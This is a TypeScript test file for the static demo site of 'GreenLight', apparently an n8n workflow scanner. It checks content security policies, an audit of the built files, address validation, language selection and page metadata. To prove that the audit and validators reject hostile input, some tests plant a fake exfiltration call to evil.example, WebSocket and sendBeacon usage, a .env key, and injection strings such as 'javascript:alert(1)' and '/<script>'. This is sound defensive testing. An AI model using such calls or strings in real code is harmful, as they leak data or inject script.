import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import vm from 'node:vm';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { REPOSITORY } from 'greenlight';
import { auditDemo } from '../scripts/demo-audit.mjs';
import { contentSecurityPolicy, inlineScriptHashes, inlineScripts, policyOf, withPolicy } from '../scripts/demo-policy.mjs';
import { addFlatSegmentNames } from '../scripts/demo-segments.mjs';
import { DEFAULT_DEMO_BASE_PATH, DEFAULT_DEMO_ORIGIN, demoBasePath, demoOrigin } from '@/lib/demo-site';
import { INSTALL_COMMANDS, REPOSITORY_URL } from '@/lib/demo';
import { DEMO_LANGUAGE_KEY, LANGUAGE_INIT_SCRIPT, chooseLanguage } from '@/lib/demo-language';
import { routeKey } from '@/lib/routes';
import { normalizePath } from '@/lib/navigation';
import { demoDocument, fullTitle, pageOf } from '@/lib/demo-titles';
import { SOCIAL_IMAGE, demoPageMetadata } from '@/lib/demo-metadata';
import { en } from '@/i18n/en';
import { es } from '@/i18n/es';
import { pageLabel } from '@/lib/navigation';
import { keyFindings } from '@/lib/findings';
import { sampleResult } from '@/lib/sample';

const page = (head: string, body = '<main>demo</main>') => `<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/>${head}</head><body>${body}</body></html>`;

describe('the policy of a page', () => {
  it('finds the inline scripts and not the ones that have a source', () => {
    const html = page('<script src="/a.js" async=""></script><script>one()</script><script type="module" src="/b.js"></script><script>two()</script>');
    expect(inlineScripts(html)).toEqual(['one()', 'two()']);
  });

  it('names each inline script by its hash, once, in order', () => {
    const html = page('<script>same()</script><script>same()</script><script>other()</script>');
    const hashes = inlineScriptHashes(html);
    expect(hashes).toHaveLength(2);
    expect(hashes.every((hash) => /^'sha256-[A-Za-z0-9+/]{43}='$/.test(hash))).toBe(true);
    expect([...hashes].sort()).toEqual(hashes);
  });

  it('puts the policy first in the head, before any script', () => {
    const html = withPolicy(page('<script>one()</script>'));
    expect(html.startsWith('<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script'));
    expect(policyOf(html)).toBe(contentSecurityPolicy(inlineScriptHashes(html)));
  });

  it('allows scripts from the site and the hashed ones only, and nothing unsafe', () => {
    const policy = contentSecurityPolicy(["'sha256-abc='"]);
    expect(policy).toContain("script-src 'self' 'sha256-abc='");
    expect(policy).toContain("default-src 'none'");
    expect(policy).toContain("form-action 'none'");
    expect(policy).toContain("base-uri 'none'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("connect-src 'self'");
    expect(policy).not.toMatch(/unsafe|\*|https?:/);
  });

  it('refuses a page that has no head', () => {
    expect(() => withPolicy('<html></html>')).toThrow();
  });
});

describe('the audit of the built demo', () => {
  let folder: string;

  beforeEach(() => {
    folder = mkdtempSync(path.join(tmpdir(), 'greenlight-demo-'));
  });

  afterEach(() => {
    rmSync(folder, { recursive: true, force: true });
  });

  function write(name: string, text: string): void {
    const target = path.join(folder, name);
    mkdirSync(path.dirname(target), { recursive: true });
    writeFileSync(target, text);
  }

  const clean = withPolicy(page('<script src="/greenlight/a.js" async=""></script><script>self.boot=1</script>', '<a href="https://github.com/jsanchez542-hub/greenlight">repo</a>'));

  it('finds nothing wrong in a plain page', () => {
    write('index.html', clean);
    write('a.js', 'console.log(1)');
    expect(auditDemo(folder).problems).toEqual([]);
  });

  it('refuses any path of an API, the name of the key and sockets', () => {
    write('index.html', clean);
    write('a.js', 'fetch("/api/scan");const k="N8N_API_KEY";new WebSocket(u);navigator.sendBeacon(u)');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('/api/');
    expect(found).toContain('N8N_API_KEY');
    expect(found).toContain('WebSocket');
    expect(found).toContain('sendBeacon');
  });

  it('refuses a call to another site, however it is written', () => {
    write('index.html', clean);
    write('a.js', 'fetch("https://evil.example/collect");x.open("GET","http://evil.example/")');
    const found = auditDemo(folder).problems;
    expect(found.some((problem) => problem.includes('absolute address'))).toBe(true);
    expect(found.some((problem) => problem.includes('another site'))).toBe(true);
  });

  it('refuses addresses of other sites and of other people on GitHub, and accepts our own', () => {
    write('index.html', withPolicy(page('', '<a href="https://github.com/someone-else/repo">x</a><img src="https://cdn.example/x.png"/>')));
    write('ok.txt', 'https://github.com/jsanchez542-hub/greenlight/releases https://jsanchez542-hub.github.io/greenlight/ http://www.w3.org/2000/svg https://react.dev/errors/1');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('someone-else');
    expect(found).toContain('cdn.example');
    expect(found).not.toContain('ok.txt');
  });

  it('refuses a form, a password field and a page without its policy', () => {
    write('index.html', clean);
    write('form/index.html', page('', '<form action="/x"><input type="password"/></form>'));
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('contains a form');
    expect(found).toContain('password field');
    expect(found).toContain('has no content security policy');
  });

  it('refuses a policy that does not match the scripts, one that is loose and one that comes late', () => {
    write('index.html', clean);
    write('tampered/index.html', clean.replace('self.boot=1', 'self.boot=2'));
    write('loose/index.html', clean.replace("script-src 'self'", "script-src 'unsafe-inline'"));
    write('late/index.html', page('<script>x()</script>' + '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'"/>'));
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('tampered/index.html: its content security policy does not match');
    expect(found).toContain('loose/index.html: its policy allows unsafe code');
    expect(found).toContain('late/index.html');
  });

  it('refuses files that have no place in a demo, like source maps and settings', () => {
    write('index.html', clean);
    write('a.js.map', '{}');
    write('.env', 'N8N_API_KEY=x');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('a.js.map: a kind of file');
    expect(found).toContain('.env: a kind of file');
  });

  it('lets only the fallback for old browsers use XMLHttpRequest', () => {
    write('index.html', withPolicy(page('<script src="/greenlight/old.js" noModule=""></script>')));
    write('old.js', 'var x=new XMLHttpRequest;');
    write('new.js', 'var x=new XMLHttpRequest;');
    const found = auditDemo(folder).problems.join('\n');
    expect(found).toContain('new.js: uses XMLHttpRequest');
    expect(found).not.toContain('old.js: uses');
  });
});

describe('the demo that was built, when there is one', () => {
  const built = path.resolve(import.meta.dirname, '..', 'out');
  let exists = true;
  try {
    readdirSync(built);
  } catch {
    exists = false;
  }

  it.skipIf(!exists)('passes the same audit, so a build that leaves something behind cannot be shipped', () => {
    expect(auditDemo(built).problems).toEqual([]);
  });

  const html = (page: string) => readFileSync(path.join(built, page), 'utf8');
  const meta = (text: string, attribute: string, name: string) =>
    new RegExp(`<meta ${attribute}="${name.replace(/[.:]/g, (c) => `\\${c}`)}" content="([^"]*)"`).exec(text)?.[1] ?? null;

  it.skipIf(!exists)('names each workflow and each finding in the title of its page', () => {
    expect(html('workflows/orders/index.html')).toContain('<title>Order confirmations | GreenLight</title>');
    expect(html('findings/orders~silent-error~0/index.html')).toContain('<title>Order confirmations, silent error | GreenLight</title>');
    expect(html('setup/index.html')).toContain('<title>Install GreenLight</title>');
    expect(html('404.html')).toContain('<title>Page not found | GreenLight</title>');
  });

  it.skipIf(!exists)('gives every page a preview for the sites a link is shared on, and keeps the page that is not there out of it', () => {
    const pages = ['index.html', 'findings/index.html', 'workflows/orders/index.html', 'checks/index.html', 'setup/index.html'];
    for (const page of pages) {
      const text = html(page);
      const url = meta(text, 'property', 'og:url');
      expect(url, page).toMatch(/^https:\/\/[^/]+\/greenlight\/(?:[a-z~-]+\/)*$/);
      expect(text, page).toContain(`<link rel="canonical" href="${url}"/>`);
      expect(meta(text, 'property', 'og:title'), page).not.toBeNull();
      expect(meta(text, 'property', 'og:description'), page).not.toBeNull();
      expect(meta(text, 'property', 'og:type'), page).toBe('website');
      expect(meta(text, 'property', 'og:image'), page).toMatch(/^https:\/\/[^/]+\/greenlight\/og\/overview\.png$/);
      expect(meta(text, 'property', 'og:image:width'), page).toBe('1200');
      expect(meta(text, 'property', 'og:image:height'), page).toBe('630');
      expect(meta(text, 'name', 'twitter:card'), page).toBe('summary_large_image');
    }
    expect(html('404.html')).not.toContain('og:url');
    expect(html('404.html')).toContain('<meta name="robots" content="noindex"/>');
  });
});

describe('the pieces a host without rewrites needs', () => {
  it('writes the dotted name of each segment file beside its folder', () => {
    const folder = mkdtempSync(path.join(tmpdir(), 'greenlight-segments-'));
    try {
      mkdirSync(path.join(folder, 'checks', '__next.KEY', 'checks'), { recursive: true });
      writeFileSync(path.join(folder, 'checks', '__next.KEY', 'checks', '__PAGE__.txt'), 'page');
      mkdirSync(path.join(folder, '__next.KEY'), { recursive: true });
      writeFileSync(path.join(folder, '__next.KEY', '__PAGE__.txt'), 'root');

      expect(addFlatSegmentNames(folder)).toBe(2);

      expect(readFileSync(path.join(folder, 'checks', '__next.KEY.checks.__PAGE__.txt'), 'utf8')).toBe('page');
      expect(readFileSync(path.join(folder, '__next.KEY.__PAGE__.txt'), 'utf8')).toBe('root');
      expect(addFlatSegmentNames(folder)).toBe(0);
    } finally {
      rmSync(folder, { recursive: true, force: true });
    }
  });
});

describe('where the demo lives', () => {
  it('defaults to the project page of the repository', () => {
    expect(demoBasePath(undefined)).toBe(DEFAULT_DEMO_BASE_PATH);
    expect(DEFAULT_DEMO_BASE_PATH).toBe('/greenlight');
  });

  it('accepts a root or a plain folder and nothing that could change an address', () => {
    expect(demoBasePath('')).toBe('');
    expect(demoBasePath('/')).toBe('');
    expect(demoBasePath('/greenlight')).toBe('/greenlight');
    expect(demoBasePath('/a/b-c_d.e')).toBe('/a/b-c_d.e');
    for (const bad of ['greenlight', '/greenlight/', '/..', '/a/../b', '/a b', '//evil.example', '/a?x=1', '/a#x', 'https://x', '/ünï', '/a\\b', '/<script>']) {
      expect(() => demoBasePath(bad), bad).toThrow();
    }
  });

  it('names the repository the way the scanner does', () => {
    expect(REPOSITORY_URL).toBe(`https://github.com/${REPOSITORY}`);
    expect(INSTALL_COMMANDS[0]).toBe(`git clone ${REPOSITORY_URL}.git`);
  });
});

describe('the language of a page with no server', () => {
  it('follows what the visitor chose, then the browser, then English', () => {
    expect(chooseLanguage('es', ['en-US'])).toBe('es');
    expect(chooseLanguage('en', ['es-ES'])).toBe('en');
    expect(chooseLanguage(null, ['fr-FR', 'es-CO', 'en'])).toBe('es');
    expect(chooseLanguage(null, ['de'])).toBe('en');
    expect(chooseLanguage(null, [])).toBe('en');
    expect(chooseLanguage('klingon', ['es'])).toBe('es');
  });

  function runScript(stored: string | null, languages: string[] | undefined, language = ''): { lang: string; pending: boolean; timers: number } {
    const attributes = new Map<string, string>();
    let timers = 0;
    const root = {
      lang: 'en',
      setAttribute: (name: string, value: string) => attributes.set(name, value),
      removeAttribute: (name: string) => attributes.delete(name),
    };
    const context = {
      document: { documentElement: root },
      localStorage: { getItem: (key: string) => (key === DEMO_LANGUAGE_KEY ? stored : null) },
      navigator: { languages, language },
      setTimeout: () => {
        timers += 1;
        return 0;
      },
    };
    vm.runInNewContext(LANGUAGE_INIT_SCRIPT, context);
    return { lang: root.lang, pending: attributes.has('data-pending'), timers };
  }

  it('is decided by the script of the head exactly as by the function, for every combination', () => {
    const stored = [null, 'es', 'en', 'fr', ''];
    const preferred: Array<string[] | undefined> = [[], ['en-US'], ['es-ES', 'en'], ['fr', 'es'], ['de', 'it'], ['ES'], ['es_MX'], undefined];
    for (const choice of stored) {
      for (const languages of preferred) {
        const expected = chooseLanguage(choice, languages ?? ['']);
        expect(runScript(choice, languages, languages === undefined ? 'es-AR' : '').lang, `${String(choice)} ${JSON.stringify(languages)}`).toBe(
          languages === undefined ? chooseLanguage(choice, ['es-AR']) : expected,
        );
      }
    }
  });

  it('holds the page back only for a language other than the one it was built in, and always lets go', () => {
    expect(runScript(null, ['en-GB'])).toMatchObject({ lang: 'en', pending: false, timers: 0 });
    expect(runScript(null, ['es'])).toMatchObject({ lang: 'es', pending: true, timers: 1 });
  });

  it('does nothing when the storage is blocked', () => {
    const root = { lang: 'en', setAttribute: () => undefined, removeAttribute: () => undefined };
    vm.runInNewContext(LANGUAGE_INIT_SCRIPT, {
      document: { documentElement: root },
      localStorage: {
        getItem: () => {
          throw new Error('blocked');
        },
      },
      navigator: { languages: ['es'] },
      setTimeout: () => 0,
    });
    expect(root.lang).toBe('en');
  });
});

describe('the pieces of the pages of the demo', () => {
  it('writes the address of a finding without colons, which a folder name cannot always hold', () => {
    expect(routeKey('orders:silent-error:0', true)).toBe('orders~silent-error~0');
    expect(routeKey('orders:silent-error:0', false)).toBe('orders:silent-error:0');
    for (const { key } of keyFindings(sampleResult.findings)) {
      expect(routeKey(key, true)).not.toMatch(/[:/\\?#%]/);
    }
  });

  it('reads a path with or without the slash a folder host puts at its end', () => {
    expect(normalizePath('/setup/')).toBe('/setup');
    expect(normalizePath('/findings/orders~silent-error~0/')).toBe('/findings/orders~silent-error~0');
    expect(normalizePath('/')).toBe('/');
    expect(normalizePath('//')).toBe('/');
    expect(normalizePath('/setup')).toBe('/setup');
  });

  it('knows which page a path is, for the title', () => {
    expect(pageOf('/')).toBe('overview');
    expect(pageOf('/findings/')).toBe('findings');
    expect(pageOf('/findings/orders~silent-error~0/')).toBe('finding');
    expect(pageOf('/workflows')).toBe('workflows');
    expect(pageOf('/workflows/orders/')).toBe('workflow');
    expect(pageOf('/checks/')).toBe('checks');
    expect(pageOf('/setup/')).toBe('setup');
    expect(pageOf('/nowhere/')).toBe('notFound');
    expect(pageOf('/constructor/')).toBe('notFound');
    expect(pageOf('/__proto__/')).toBe('notFound');
  });
});

describe('what the pages of the demo are called', () => {
  const title = (pathname: string, messages = en, lang: 'en' | 'es' = 'en') =>
    fullTitle(demoDocument(pathname, sampleResult, messages, lang), messages);

  it('names the install page once, the same way as its breadcrumb and its heading', () => {
    expect(title('/setup/')).toBe('Install GreenLight');
    expect(title('/setup/', es, 'es')).toBe('Instala GreenLight');
    for (const messages of [en, es]) {
      expect(pageLabel('/setup/', messages, true)).toBe(messages.demo.title);
      expect(messages.demo.title.toLowerCase()).toBe(messages.demo.pageTitle.toLowerCase());
    }
  });

  it('names a workflow by its name and a finding by its workflow and its check, in each language', () => {
    expect(title('/workflows/orders/')).toBe('Order confirmations | GreenLight');
    expect(title('/workflows/orders/', es, 'es')).toBe('Order confirmations | GreenLight');
    expect(title('/findings/orders~silent-error~0/')).toBe('Order confirmations, silent error | GreenLight');
    expect(title('/findings/orders~silent-error~0/', es, 'es')).toBe('Order confirmations, error silencioso | GreenLight');
    expect(title('/findings/inventory~duration-drift~0/', es, 'es')).toBe('Inventory sync, ralentización | GreenLight');
  });

  it('describes a workflow by its state and a finding by its sentence, in each language', () => {
    expect(demoDocument('/workflows/orders/', sampleResult, en, 'en').description).toBe(
      'Critical: At least one check raised a critical finding.',
    );
    expect(demoDocument('/findings/orders~silent-error~0/', sampleResult, es, 'es').description).toContain('devolvió un error');
  });

  it('falls back to the name of the kind of page for one it does not know', () => {
    expect(title('/workflows/nobody/')).toBe('Workflow | GreenLight');
    expect(title('/findings/nothing~here~0/')).toBe('Finding | GreenLight');
  });

  it('says that a page is not there, in each language', () => {
    expect(title('/nowhere/')).toBe('Page not found | GreenLight');
    expect(title('/_not-found/', es, 'es')).toBe('Página no encontrada | GreenLight');
  });

  it('keeps the name of the connection in the real dashboard', () => {
    expect(pageLabel('/setup', en, false)).toBe('setup');
    expect(pageLabel('/setup', es, false)).toBe('conexión');
    expect(en.meta.pages.setup.title).toBe('Connect your n8n');
  });

  it('keeps the other pages as they were', () => {
    expect(title('/checks/', es, 'es')).toBe('Comprobaciones | GreenLight');
    expect(pageLabel('/checks/', es, true)).toBe('comprobaciones');
  });
});

describe('what a shared link of the demo shows', () => {
  const origin = 'https://example.github.io';

  it('builds every address from the published origin and folder', () => {
    expect(demoOrigin(undefined)).toBe(DEFAULT_DEMO_ORIGIN);
    expect(DEFAULT_DEMO_ORIGIN).toBe('https://jsanchez542-hub.github.io');
    expect(demoOrigin(origin)).toBe(origin);
    expect(demoOrigin(`${origin}/`)).toBe(origin);
  });

  it('accepts only a bare https origin', () => {
    for (const bad of ['http://example.github.io', 'https://example.github.io/greenlight', 'https://user:pw@example.github.io', 'https://example.github.io?x=1', 'https://example.github.io#x', 'javascript:alert(1)', 'example.github.io', '']) {
      expect(() => demoOrigin(bad), bad).toThrow();
    }
  });

  it('gives a page its title, its description, its canonical address and a large preview', () => {
    const metadata = demoPageMetadata('/workflows/orders/');
    expect(metadata.title).toBe('Order confirmations');
    expect(metadata.alternates?.canonical).toMatch(/\/workflows\/orders\/$/);
    expect(metadata.openGraph).toMatchObject({
      type: 'website',
      siteName: 'GreenLight',
      title: 'Order confirmations | GreenLight',
      description: 'Critical: At least one check raised a critical finding.',
      locale: 'en_US',
    });
    expect(metadata.twitter).toMatchObject({ card: 'summary_large_image', title: 'Order confirmations | GreenLight' });
  });

  it('gives the home page the name of the product and the install page its own title, once', () => {
    expect(demoPageMetadata('/').openGraph).toMatchObject({ title: en.meta.defaultTitle, description: en.meta.description });
    expect(demoPageMetadata('/setup/').title).toEqual({ absolute: 'Install GreenLight' });
    expect(demoPageMetadata('/setup/').openGraph).toMatchObject({ title: 'Install GreenLight' });
  });

  it('points the preview at an image of 1200 by 630 that is in the site', () => {
    const image = path.resolve(import.meta.dirname, '..', 'public', SOCIAL_IMAGE.path.slice(1));
    const header = readFileSync(image);
    expect(header.subarray(1, 4).toString('ascii')).toBe('PNG');
    expect(header.readUInt32BE(16)).toBe(SOCIAL_IMAGE.width);
    expect(header.readUInt32BE(20)).toBe(SOCIAL_IMAGE.height);
    expect(header.length).toBeLessThan(300 * 1024);
  });
});
